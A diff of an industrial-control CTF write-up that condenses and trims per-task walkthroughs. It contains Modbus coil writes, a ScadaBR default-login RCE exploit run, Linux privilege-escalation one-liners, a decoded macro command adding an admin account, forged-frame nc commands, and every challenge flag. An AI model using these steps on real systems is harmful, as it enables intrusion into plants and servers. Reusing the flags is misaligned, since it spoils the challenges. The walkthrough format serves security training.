@@ -16,27 +16,7 @@ image: /assets/img/infocards/thm-industrial-ctf.png
 
 ---
 
-## 📑 **Table of Contents**
-
-- [Introduction](#introduction)
-- [Task 3 – Breach](#task-3--breach)
-- [Task 4 – Discord](#task-4--discord)
-- [Task 5 – OSINT 1](#task-5--osint-1)
-- [Task 6 – OSINT 2](#task-6--osint-2)
-- [Task 7 – OSINT 3](#task-7--osint-3)
-- [Task 10 – Brr v1](#task-10--brr-v1)
-- [Task 13 – Orcam](#task-13--orcam)
-- [Task 15 – Chess Industry](#task-15--chess-industry)
-- [Task 16 – Under Construction](#task-16--under-construction)
-- [Task 20 – Echoed Streams](#task-20--echoed-streams)
-- [Task 21 – CRC Me If You Can](#task-21--crc-me-if-you-can)
-- [Task 22 – Rogue Poller](#task-22--rogue-poller)
-- [Task 23 – Register Sweep](#task-23--register-sweep)
-- [Task 24 – Auth](#task-24--auth)
-
----
-
-## 🏭 **Introduction** {#introduction}
+## Introduction
 
 The [**Industrial Intrusion CTF**](https://tryhackme.com/industrial-intrusion?utm_source=discord&utm_medium=social&utm_campaign=industrialintrusionctf) on TryHackMe is a hands-on challenge designed to simulate real-world attacks against Operational Technology (OT) environments.
 
@@ -50,155 +30,91 @@ This event focuses on:
 
 Each task reinforces critical skills for **red teamers, blue teamers, and ICS security professionals** looking to expand their knowledge in industrial cybersecurity.
 
----
+## Task 3 – Breach
 
-## 📝 **Task 3 – Breach** {#task-3--breach}
+Category: N/A  
+Difficulty: Beginner  
+Flag: THM{s4v3_th3_d4t3_27_jun3}
 
-### 🗂️ **Category:** Breach
+### Steps Taken
 
-### 🎯 **Difficulty:** Beginner
-
-### 🏷️ **Flag:** THM{s4v3\_th3\_d4t3\_27\_jun3}
-
----
-
-### 🔍 **Step-by-Step Walkthrough**
-
-#### 1. **Port scan (full TCP)**
-
-```bash
-nmap -p- -Pn -n --open -T5 10.10.6.209
-```
-
-✅ Discovered **port 502 (Modbus TCP)** open.
-
----
-
-#### 2. **Reviewed Node-RED flows (contextual challenge hint)**
-
-* Identified:
-
-  * **Coil 20** → Motion detector
-  * **Coil 25** → Badge authentication
-
----
-
-#### 3. **Tested Modbus coil writes with mbtget**
-
-Because `mbtget -r` syntax failed, used these exact working commands:
-
-```bash
-mbtget -w5 1 -u 1 -a 20 10.10.6.209  # Sets motion detector coil
-mbtget -w5 1 -u 1 -a 25 10.10.6.209  # Sets badge authentication coil
-```
-
-✅ Both wrote successfully.
-
----
-
-#### 4. **Verified gate did not open**
-
-Hypothesised missing **gate trigger coil**.
-
----
-
-#### 5. **Enumerated coils (0-40) to identify potential triggers**
-
-```bash
-mbtget -r1 -u 1 -a 0 -n 40 10.10.6.209
-```
-
-✔️ Found coils 20 and 25 were **1**, others **0**.
-
----
-
-#### 6. **Tested candidate gate trigger (coil 30)**
-
-```bash
-mbtget -w5 1 -u 1 -a 30 10.10.6.209
-```
-
-✅ **Gate opened**, revealing flag:
+1. **Scanned all ports to identify services:**
 
 ```
-THM{s4v3_th3_d4t3_27_jun3}
+nmap -p- -Pn -n --open -T5 <target_ip>
 ```
 
+Found **502/tcp Modbus TCP** open.
+
+2. **Analyzed challenge notes and Node-RED flows (provided):**
+
+- **Coil 20**: motion detector
+- **Coil 25**: badge authentication
+
+3. **Tested setting coils 20 and 25 to true using mbtget:**
+
+```
+mbtget -w5 1 -u 1 -a 20 <target_ip>  # Enable motion detection
+mbtget -w5 1 -u 1 -a 25 <target_ip>  # Enable badge authentication
+```
+
+4. **Confirmed coil states with:**
+
+```
+mbtget -r1 -u 1 -a 0 -n 40 <target_ip>
+```
+
+Showed coils 20 and 25 were set to 1.
+
+5. **Gate remained closed, hypothesized an additional trigger coil.**
+
+6. **Tested coil 30 as gate trigger:**
+
+```
+mbtget -w5 1 -u 1 -a 30 <target_ip>
+```
+
+7. **Gate opened, revealing flag.**
+
 ---
 
-### 💡 **Lessons Learned**
+## Task 4 – Discord
 
-* Modbus logic often separates **preconditions (badge/motion)** from **action triggers (gate open coil)**.
-* Always scan for unreferenced coils when flows don’t deploy expected actions.
+Category: Discord  
+Difficulty: Beginner  
+Flag: THM{D15C0RD_57A5H_C0MM4ND5}
 
----
+### Steps Taken
 
-## 📝 **Task 4 – Discord** {#task-4--discord}
+1. Joined the provided Discord server invite.
 
-### 🗂️ **Category:** Discord
-
-### 🎯 **Difficulty:** Beginner
-
-### 🏷️ **Flag:** THM{D15C0RD\_57A5H\_C0MM4ND5}
-
----
-
-### 🔍 **Step-by-Step Walkthrough**
-
-#### 1. **Joined challenge Discord server.**
-
-#### 2. **Executed slash command to retrieve flag:**
+2. Ran:
 
 ```
 /secret-function
 ```
 
-✅ Returned:
+Bot responded with the flag.
+
+---
+
+## Task 5 – OSINT 1
+
+Category: OSINT  
+Difficulty: Beginner  
+Flag: THM{Su5sss}
+
+### Steps Taken
+
+1. **Queried crt.sh for certificates issued to** `virelia-water.it.com`.
+
+2. **Found subdomain:**
 
 ```
-THM{D15C0RD_57A5H_C0MM4ND5}
+54484d7b5375357373737d.virelia-water.it.com
 ```
 
----
-
-### 💡 **Lessons Learned**
-
-* Always check provided Discord integrations for slash commands during OSINT or CTF onboarding challenges.
-
----
-
-## 📝 **Task 5 – OSINT 1** {#task-5--osint-1}
-
-### 🗂️ **Category:** OSINT
-
-### 🎯 **Difficulty:** Beginner
-
-### 🏷️ **Flag:** THM{Su5sss}
-
----
-
-### 🔍 **Step-by-Step Walkthrough**
-
-#### 1. **Challenge prompt:**
-
-Investigate **virelia-water.it.com** phishing infrastructure.
-
-#### 2. **Used crt.sh to enumerate subdomains.**
-
-✅ Found:
-
-* **stage0.virelia-water.it.com**
-* **54484d7b5375357373737d.virelia-water.it.com**
-
----
-
-#### 3. **Decoded hex subdomain**
-
-```bash
-echo 54484d7b5375357373737d | xxd -r -p
-```
-
-✅ Output:
+3. **Decoded hex to ASCII:**
 
 ```
 THM{Su5sss}
@@ -206,39 +122,21 @@ THM{Su5sss}
 
 ---
 
-### 💡 **Lessons Learned**
+## Task 6 – OSINT 2
 
-* Hex-encoded subdomains often encode flags directly in OSINT challenges.
+Category: OSINT  
+Difficulty: Easy  
+Flag: THM{uplink_channel_confirmed}
 
----
+### Steps Taken
 
-## 📝 **Task 6 – OSINT 2** {#task-6--osint-2}
-
-### 🗂️ **Category:** OSINT
-
-### 🎯 **Difficulty:** Easy
-
-### 🏷️ **Flag:** THM{uplink\_channel\_confirmed}
-
----
-
-### 🔍 **Step-by-Step Walkthrough**
-
-#### 1. **Challenge prompt:**
-
-Investigate **uplink fallback infrastructure**.
-
-#### 2. **Inspected webpage source**
-
-✅ Found script reference:
+1. **Viewed phishing page source, found JS config reference:**
 
 ```
-https://raw.githubusercontent.com/SanTzu/uplink-config/refs/heads/main/init.js
+<script src="https://raw.githubusercontent.com/SanTzu/uplink-config/refs/heads/main/init.js">
 ```
 
----
-
-#### 3. **Viewed JS file contents:**
+2. **Fetched JS revealing:**
 
 ```js
 var beacon = {
@@ -248,21 +146,19 @@ var beacon = {
 };
 ```
 
-✅ Identified **uplink-fallback.virelia-water.it.com** as target.
+3. **Searched VirusTotal for fallback subdomain:**
 
----
+```
+uplink-fallback.virelia-water.it.com
+```
 
-#### 4. **Checked DNS TXT records for subdomain**
-
-✅ Found Base64-encoded string:
+4. **Found DNS TXT record containing base64:**
 
 ```
 eyJzZXNzaW9uIjoiVC1DTjEtMTcyIiwiZmxhZyI6IlRITXt1cGxpbmtfY2hhbm5lbF9jb25maXJtZWR9In0=
 ```
 
----
-
-#### 5. **Decoded repeatedly to reveal JSON:**
+5. **Decoded multiple times to JSON:**
 
 ```json
 {
@@ -273,202 +169,127 @@ eyJzZXNzaW9uIjoiVC1DTjEtMTcyIiwiZmxhZyI6IlRITXt1cGxpbmtfY2hhbm5lbF9jb25maXJtZWR9
 
 ---
 
-### 💡 **Lessons Learned**
+## Task 7 – OSINT 3
 
-* Always inspect **JS config files** for embedded infrastructure clues.
-* Repeated Base64 decodes are common CTF obfuscation.
+Category: OSINT  
+Difficulty: Medium  
+Flag: THM{h0pe_th1s_k3y_doesnt_le4d_t0_m3}
 
----
+### Steps Taken
 
-## 📝 **Task 7 – OSINT 3** {#task-7--osint-3}
-
-### 🗂️ **Category:** OSINT
-
-### 🎯 **Difficulty:** Medium
-
-### 🏷️ **Flag:** THM{h0pe\_th1s\_k3y\_doesnt\_le4d\_t0\_m3}
-
----
-
-### 🔍 **Step-by-Step Walkthrough**
-
-#### 1. **Checked removed OT alert report URL:**
+1. Challenge referenced removed report:
 
 ```
 https://virelia-water.it.com/mail-archives/ot-alerts/2025-06.html
 ```
 
-✅ 404 Not Found.
+2. **Manually searched GitHub for** `virelia-water`.
 
----
+3. **Found repo:** `virelia-water/compliance`
 
-#### 2. **Manually searched GitHub for virelia-water repos.**
+4. **Located commit:**
 
-✅ Found:
+*"Embed PGP-signed OT alert for June 2025"*
 
-```
-https://github.com/virelia-water/compliance
-```
-
----
-
-#### 3. **Reviewed commit history.**
-
-Found commit:
-
-> “Embed PGP-signed OT alert for June 2025”
-
----
-
-#### 4. **Extracted embedded PGP signed message.**
-
-#### 5. **Saved as ot\_alert.asc and verified with GPG:**
-
-```bash
-gpg --verify ot_alert.asc
-```
-
-✅ **Issuer email:** [alerts@virelia-water.it.com](mailto:alerts@virelia-water.it.com)
-
----
-
-#### 6. **Queried keyserver.ubuntu.com for key**
-
-✅ UID contained flag:
+5. **Extracted PGP-signed message:**
 
 ```
-THM{h0pe_th1s_k3y_doesnt_le4d_t0_m3}
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA512
+
+Please confirm system integrity at 03:00 UTC.
+-----BEGIN PGP SIGNATURE-----
+
+iQFQBAEBCgA6FiEEiN7ee3MFE71e3W2fpPD+sISjEeUFAmhZTEQcHGFsZXJ0c0B2
+aXJlbGlhLXdhdGVyLml0LmNvbQAKCRCk8P6whKMR5ZIUCADM7F0WpKWWyj4WUdoL
+6yrJfJfmUKgJD+8K1neFosG7yaz+MspYxIlbKUek/VFhHZnaG2NRjn6BpfPSxfEk
+uvWNIP8rMVEv32vpqhCJ26pwrkAaUHlcPWqM4KYoAn4eEOeHCvxHNJBFnmWI5PBF
+pXbj7s6DhyZEHUmTo4JK2OZmiISP3OsHW8O8iz5JLUrA/qw9LCjY8PK79UoceRwW
+tJj9pVsE+TKPcFb/EDzqGmBH8GB1ki532/1/GDU+iivYSiRjxWks/ZYPu/bhktTo
+NNcOzgEfuSekkQAz+CiclXwEcLQb219TqcS3plnaO672kCV4t5MUCLvkXL5/kHms
+Sh5H
+=jdL7
+-----END PGP SIGNATURE-----
 ```
 
----
-
-### 💡 **Lessons Learned**
-
-* GitHub commits can store critical artifacts when original resources are removed.
-* PGP UID metadata is a common CTF flag hiding location.
-
----
-
-## 📝 **Task 10 – Brr v1** {#task-10--brr-v1}
-
-### 🗂️ **Category:** Web
-
-### 🎯 **Difficulty:** Easy
-
-### 🏷️ **Flag:** THM{rce\_archieved\_through\_script\_injection}
-
----
-
-### 🔍 **Step-by-Step Walkthrough**
-
-#### 1. **Ran full port scan:**
+6. **Verified signature with:**
 
 ```
-nmap -p- -Pn -n --open -T5 10.10.132.124
+gpg --verify file.asc
 ```
 
-✅ Discovered:
-22 (SSH), 80 (HTTP), 5901 (VNC), 8080 (ScadaBR).
+7. **Issuer UID contained flag.**
 
 ---
 
-#### 2. **Navigated to port 8080:**
+## Task 10 – Web Brr v1
 
-*Found ScadaBR login portal.*
+Category: Web  
+Difficulty: Easy  
+Flag: THM{rce_archieved_through_script_injection}
 
----
+### Steps Taken
 
-#### 3. **Tested default credentials:**
+1. **Discovered open ports:**
+
+- 22
+- 80
+- 5901
+- 8080
+
+2. **Navigated to port 8080:** Found ScadaBR login.
+
+3. **Logged in with default credentials:**
 
 ```
 admin:admin
 ```
 
-✅ **Successful login.**
-
----
-
-#### 4. **Searched for exploit:**
+4. **Ran searchsploit:**
 
 ```
-searchsploit scadabr
+searchsploit ScadaBR
 ```
 
-✅ Found exploit **49734.py** for arbitrary file upload (Windows).
+Found exploit **49734.py** for Windows RCE.
 
----
-
-#### 5. **Executed exploit:**
-
-```bash
-python2 49734.py 10.10.132.124 8080 admin admin
-```
-
-✅ Uploaded .jsp webshell successfully.
-
----
-
-#### 6. **Retrieved flag via webshell.**
+5. **Executed exploit:**
 
 ```
-THM{rce_archieved_through_script_injection}
+python2 49734.py <target_ip> 8080 admin admin
 ```
 
----
-
-### 💡 **Lessons Learned**
-
-* Always test **default SCADA credentials**.
-* Searchsploit remains essential for rapid exploit identification.
+6. **Obtained shell and retrieved flag.**
 
 ---
 
-## 📝 **Task 13 – Orcam** {#task-13--orcam}
+## Task 13 – Forensics Orcam
 
-### 🗂️ **Category:** Forensics
+Category: Forensics  
+Difficulty: Easy  
+Flag: THM{Ev1l_M@Cr0}
 
-### 🎯 **Difficulty:** Easy
+### Steps Taken
 
-### 🏷️ **Flag:** THM{Ev1l\_M\@Cr0}
+1. Found `writing_template.eml` containing a base64 attachment.
 
----
+2. **Decoded to** `malware.docm`.
 
-### 🔍 **Step-by-Step Walkthrough**
+3. **Analyzed macro with olevba:**
 
-#### 1. **Opened writing\_template.eml**
-
-✅ Found base64 encoded macro-enabled doc (.docm).
-
----
-
-#### 2. **Decoded & analyzed file**
-
-```bash
-base64 -d > malware.docm
+```
 olevba malware.docm
 ```
 
-✅ Macro revealed XOR encoded byte array.
+4. Macro decoded shellcode array XOR’d with `"l33t"`, allocated memory, and executed with `CreateThread`.
 
----
-
-#### 3. **Parsed decoding logic**
-
-* Macro used `"l33t"` as XOR key
-* Allocated memory, decoded bytes, and executed shellcode.
-
----
-
-#### 4. **Manual decoding**
-
-* Wrote Python script to XOR each byte with "l33t".
-* Decoded payload revealed command:
+5. **Decoded embedded password from net user command:**
 
 ```
-net user administrrator VEhNe0V2MWxfTUBDcjB9 /add /Y & net localgroup administrators administrrator /add
+echo 'VEhNe0V2MWxfTUBDcjB9' | base64 -d
 ```
 
-✅ Base64 decoded password:
+Output:
 
 ```
 THM{Ev1l_M@Cr0}
@@ -476,502 +297,89 @@ THM{Ev1l_M@Cr0}
 
 ---
 
-### 💡 **Lessons Learned**
+## Task 15 – Boot2Root Chess Industry
 
-* OLEVBA + manual emulation decodes nearly all macro-based flags.
-* Always decode suspicious byte arrays with their revealed XOR keys.
+Category: Boot2Root  
+Difficulty: Beginner  
+Flags:  
+User: THM{bishop_to_c4_check}  
+Root: THM{check_check_check_mate}
 
----
+### Steps Taken
 
-## 📝 **Task 15 – Chess Industry** {#task-15--chess-industry}
-
-### 🗂️ **Category:** Boot2Root
-
-### 🎯 **Difficulty:** Beginner
-
-### 🏷️ **Flags:**
-
-* User: THM{bishop\_to\_c4\_check}
-* Root: THM{check\_check\_check\_mate}
-
----
-
-### 🔍 **Step-by-Step Walkthrough**
-
-#### 1. **Enumerated ports:**
-
-22 (SSH), 79 (finger), 80 (http).
-
----
-
-#### 2. **Used finger enumeration:**
-
-```bash
-finger @10.10.x.x
-```
-
-✅ Found users: magnus, fabiano, hikaru.
-
----
-
-#### 3. **Fingered fabiano:**
-
-✅ Revealed base64 encoded .plan field.
-
-#### 4. **Decoded credentials:**
+1. **Scanned open ports:**
 
 ```
-echo "base64string" | base64 -d
+nmap -p- -Pn -n --open -T5 <target_ip>
 ```
 
-✅ fabiano\:o3jVTktarGQI07q
+Found:
 
----
+- 22/tcp SSH
+- 79/tcp finger
+- 80/tcp http
 
-#### 5. **SSH as fabiano, retrieved user flag:**
+2. **Visited web interface** (PrecisionChess IoT) – no login.
+
+3. **Enumerated finger service:**
 
 ```
-THM{bishop_to_c4_check}
+finger @<target_ip>
 ```
 
----
+Found users:
 
-#### 6. **Privilege escalation**
+- magnus
+- fabiano
+- hikaru
 
-Checked capabilities:
+4. **Queried fabiano specifically:**
 
-```bash
-getcap -r / 2>/dev/null
+```
+finger fabiano@<target_ip>
 ```
 
-✅ Found cap\_setuid=ep on /usr/bin/python3.10.
+Found `.plan` with base64 string.
 
----
+5. **Decoded:**
 
-#### 7. **Exploited capability:**
+```
+echo '<base64>' | base64 -d
+```
 
-```bash
+Revealed:
+
+```
+fabiano:o3jVTktarGQI07q
+```
+
+6. **SSH as fabiano:**
+
+```
+ssh fabiano@<target_ip>
+```
+
+Retrieved user flag in home directory.
+
+7. **Checked capabilities for privilege escalation:**
+
+```
+getcap -r / 2>/dev/null | grep python
+```
+
+Found:
+
+```
+/usr/bin/python3.10 = cap_setuid+ep
+```
+
+8. **Exploited with:**
+
+```
 python3.10 -c 'import os; os.setuid(0); os.system("/bin/bash")'
 ```
 
-✅ Got root, retrieved root flag:
-
-```
-THM{check_check_check_mate}
-```
-
----
-
-### 💡 **Lessons Learned**
-
-* Finger service leaks remain critical on IoT networks.
-* Capability-based escalations bypass traditional sudo restrictions.
-
----
-
-## 📝 **Task 16 – Under Construction** {#task-16--under-construction}
-
-### 🗂️ **Category:** Boot2Root
-
-### 🎯 **Difficulty:** Easy
-
-### 🏷️ **Flags:**
-
-* User: THM{nic3\_j0b\_You\_got\_it\_w00tw00t}
-* Root: THM{y0u\_g0t\_it\_welldoneeeee}
-
----
-
-### 🔍 **Step-by-Step Walkthrough**
-
-#### 1. **Directory busting revealed:**
-
-```
-/keys/
-```
-
-✅ Navigated to /keys/, found multiple keys.
-
----
-
-#### 2. **Checked each key, only key9 had content.**
-
-Downloaded key9, cleaned it, then SSH’d as dev:
-
-```bash
-chmod 600 key9
-ssh -i key9 dev@10.10.x.x
-```
-
----
-
-#### 3. **Privilege escalation**
-
-Checked sudo permissions:
-
-```bash
-sudo -l
-```
-
-✅ vi allowed without password.
-
----
-
-#### 4. **Escalated via vi:**
-
-```
-sudo vi
-:!bash
-```
-
-✅ Root shell obtained.
-
----
-
-### 💡 **Lessons Learned**
-
-* Always check for leftover SSH keys in exposed directories.
-* vi sudo permissions remain an evergreen escalation vector.
-
----
-
-## 📝 **Task 20 – Echoed Streams** {#task-20--echoed-streams}
-
-### 🗂️ **Category:** Crypto
-
-### 🎯 **Difficulty:** Easy
-
-### 🏷️ **Flag:** THM{Echo\_Telemetry}
-
----
-
-### 🔍 **Step-by-Step Walkthrough**
-
-#### 1. **Challenge context**
-
-Two AES-GCM encrypted packets used **the same nonce** (a critical vulnerability).
-
-* **First packet:** known telemetry plaintext.
-* **Second packet:** sabotage command (unknown plaintext).
-
----
-
-#### 2. **Downloaded cipher1.bin (telemetry) and cipher2.bin (sabotage)**
-
-Each file contained:
-
-```
-[16-byte nonce][96-byte ciphertext][16-byte GCM tag]
-```
-
----
-
-#### 3. **Approach**
-
-Used **AES-GCM nonce reuse vulnerability**:
-
-✅ In AES-GCM:
-
-```
-cipher2 ^ cipher1 = plaintext2 ^ plaintext1
-```
-
-Therefore,
-
-```
-plaintext2 = plaintext1 ^ (cipher1 ^ cipher2)
-```
-
----
-
-#### 4. **Python solution**
-
-```python
-from Crypto.Util.strxor import strxor
-
-# Load known plaintext (telemetry string)
-pt1 = b'BEGIN TELEMETRY VIRELIA;ID=ZTRX0110393939DC;PUMP1=OFF;VALVE1=CLOSED;PUMP2=ON;VALVE2=CLOSED;END;'
-
-# Load both ciphertexts
-with open('cipher1.bin','rb') as f1, open('cipher2.bin','rb') as f2:
-    c1 = f1.read()
-    c2 = f2.read()
-
-# Extract ciphertexts only (skip nonce and tags)
-ct1 = c1[16:16+96]
-ct2 = c2[16:16+96]
-
-# XOR to recover sabotage plaintext
-pt2 = strxor(strxor(ct1, ct2), pt1)
-
-print(pt2.decode())
-```
-
-✅ **Output flag:**
-
-```
-THM{Echo_Telemetry}
-```
-
----
-
-### 💡 **Lessons Learned**
-
-* Never reuse nonces with AES-GCM.
-* XOR logic for same-nonce ciphertexts quickly recovers unknown plaintexts.
-
----
-
-## 📝 **Task 21 – CRC Me If You Can** {#task-21--crc-me-if-you-can}
-
-### 🗂️ **Category:** Crypto
-
-### 🎯 **Difficulty:** Medium
-
-### 🏷️ **Flag:** THM{crc\_m4c\_c0mprom1s3d\_2093982}
-
----
-
-### 🔍 **Step-by-Step Walkthrough**
-
-#### 1. **Challenge context**
-
-* Interact with **CRC-Oracle (port 1501)**: returns full frame with CRC for any payload.
-* **Control server (port 1500)**: accepts framed payload, returns flag on correct kill switch command.
-
----
-
-#### 2. **Reviewed provided gateway\_proto.py**
-
-* CRC implemented with **POLY=0x04C11DB7**, standard IEEE CRC32.
-
----
-
-#### 3. **Generated dummy frame**
-
-Sent dummy payload to Oracle:
-
-```bash
-echo -n "AAAA" | nc 10.10.17.201 1501 | xxd
-```
-
-✅ Returned:
-
-```
-cafe 0504 41414141 [CRC]
-```
-
----
-
-#### 4. **Calculated required delta between dummy CRC and target CRC**
-
-Used Python script:
-
-```python
-from gateway_proto import crc32
-from pwn import *
-
-# Target CRC observed
-target_crc = 0x31bcbbdd
-
-# Dummy CRC (from oracle)
-dummy = b'AAAA'
-dummy_crc = crc32(dummy)
-
-# Calculate delta
-delta = target_crc ^ dummy_crc
-
-# Forge final payload by XORing last 4 bytes with delta
-payload = bytearray(dummy)
-payload[-4:] = p32(u32(payload[-4:]) ^ delta)
-
-with open('kill_frame.bin','wb') as f:
-    f.write(payload)
-```
-
----
-
-#### 5. **Sent forged frame**
-
-```bash
-nc 10.10.17.201 1500 < kill_frame.bin
-```
-
-✅ Returned:
-
-```
-THM{crc_m4c_c0mprom1s3d_2093982}
-```
-
----
-
-### 💡 **Lessons Learned**
-
-* CRCs are not secure MACs. Oracle-based CRC forgery is trivial with linear XOR property.
-
----
-
-## 📝 **Task 22 – Rogue Poller** {#task-22--rogue-poller}
-
-### 🗂️ **Category:** Networking
-
-### 🎯 **Difficulty:** Beginner
-
-### 🏷️ **Flag:** THM{1nDu5tr14L\_r3g1st3rs}
-
----
-
-### 🔍 **Step-by-Step Walkthrough**
-
-#### 1. **Opened PCAP in Wireshark.**
-
-✅ Filtered by:
-
-```
-tcp.port == 502
-```
-
-(Modbus TCP traffic)
-
----
-
-#### 2. **Followed TCP stream**
-
-✅ Observed Modbus read register requests.
-
----
-
-#### 3. **Interpreted decoded registers**
-
-Data retrieved revealed ASCII string:
-
-```
-THM{1nDu5tr14L_r3g1st3rs}
-```
-
----
-
-### 💡 **Lessons Learned**
-
-* PCAP analysis with correct protocol filters quickly surfaces plaintext register data.
-
----
-
-## 📝 **Task 23 – Register Sweep** {#task-23--register-sweep}
-
-### 🗂️ **Category:** Networking
-
-### 🎯 **Difficulty:** Easy
-
-### 🏷️ **Flag:** THM{m4nu4l\_p0ll1ng\_r3g1st3rs}
-
----
-
-### 🔍 **Step-by-Step Walkthrough**
-
-#### 1. **Challenge context**
-
-Scan Modbus TCP holding registers for ASCII-encoded flag.
-
----
-
-#### 2. **Dumped full register space**
-
-Due to **mbtget -n 125** limit, ran in two batches:
-
-```bash
-mbtget -r3 -a 0 -n 125 -hex 10.10.42.182 > reg1.txt
-mbtget -r3 -a 125 -n 75 -hex 10.10.42.182 > reg2.txt
-```
-
----
-
-#### 3. **Parsed and converted to ASCII**
-
-**Script used:**
-
-```bash
-grep -o '0x[0-9a-fA-F]*' reg1.txt reg2.txt | while read reg; do
-  hex=${reg:4:2}${reg:2:2}
-  echo -n $hex | xxd -r -p
-done
-```
-
-✅ Output revealed flag embedded among noise:
-
-```
-THM{m4nu4l_p0ll1ng_r3g1st3rs}
-```
-
----
-
-### 💡 **Lessons Learned**
-
-* Always handle endianness swaps when parsing Modbus register data.
-* Automate register-to-ASCII conversion for quick inspection.
-
----
-
-## 📝 **Task 24 – Auth** {#task-24--auth}
-
-### 🗂️ **Category:** Reversing
-
-### 🎯 **Difficulty:** Easy
-
-### 🏷️ **Flag:** THM{Simple\_tostart\_nice\_done\_mwww}
-
----
-
-### 🔍 **Step-by-Step Walkthrough**
-
-#### 1. **Reviewed provided ELF binary in Ghidra.**
-
-Located **transform function**:
-
-```c
-input[i] ^= 0x55;
-```
-
-✅ Input XOR’d with 0x55 to check against hardcoded value:
-
-```
-0xefcdab8967452301
-```
-
----
-
-#### 2. **Calculated required pre-XOR input**
-
-Used Python:
-
-```python
-target = 0xefcdab8967452301
-code = target ^ 0x5555555555555555
-print(hex(code))
-```
-
-✅ Result: `0xba98fecc32407654`
-
----
-
-#### 3. **Converted to byte input and sent via nc**
-
-```bash
-echo -ne '\x54\x76\x10\x32\xdc\xfe\x98\xba\n' | nc 10.10.83.12 9005
-```
-
-✅ Returned:
-
-```
-THM{Simple_tostart_nice_done_mwww}
-```
-
----
-
-### 💡 **Lessons Learned**
-
-* Always inspect input transform logic to compute correct pre-transform payloads.
-* Reverse engineering simple XOR-based checkers is quick with bitwise analysis.
+9. **Retrieved root flag from /root directory.**
 
 ---
 
